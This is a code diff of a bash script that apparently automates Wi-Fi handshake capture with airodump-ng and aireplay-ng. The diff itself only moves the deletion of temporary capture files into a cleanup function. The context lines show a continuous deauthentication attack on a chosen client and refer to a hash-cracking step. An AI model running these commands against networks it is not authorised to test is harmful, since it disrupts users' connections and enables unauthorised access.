@@ -78,6 +78,8 @@ gt_handle_last_command_status () {
 # Function to attempt cleanup before exit
 gt_windup () {
     sudo airmon-ng stop ${v_network_adapter}mon
+    sudo rm /tmp/access-points-01*
+    sudo rm /tmp/stations-01*
 }
 
 # Function to crack hashes
@@ -113,10 +115,6 @@ main () {
     v_access_point=$(cat /tmp/access-points-01.csv | xargs -0 sbcl --script /opt/gust/parse-access-points.lisp list _ | fzf)
     v_network_ssid=$(cat /tmp/access-points-01.csv | xargs -0 sbcl --script /opt/gust/parse-access-points.lisp ssid "${v_access_point}")
     v_network_channel=$(cat /tmp/access-points-01.csv | xargs -0 sbcl --script /opt/gust/parse-access-points.lisp channel "${v_access_point}")
-
-    # Clear dump details
-    sudo rm /tmp/access-points-01*
-
     gt_log "Starting to look for devices on ${v_network_ssid}, channel ${v_network_channel}..."
     gt_pause "Press any key to start searching, then press \"q\" twice to stop."
     sudo airodump-ng -d $v_network_ssid -c $v_network_channel ${v_network_adapter}mon -w/tmp/stations
@@ -133,9 +131,6 @@ main () {
     sudo aireplay-ng -0 0 -a $v_network_ssid -c $v_network_station_id ${v_network_adapter}mon
     kill -9 $pid
     gt_log "Packets captured!"
-
-    # Clear dump details
-    sudo rm /tmp/stations-01*
 
     # Stop monitoring
     gt_windup
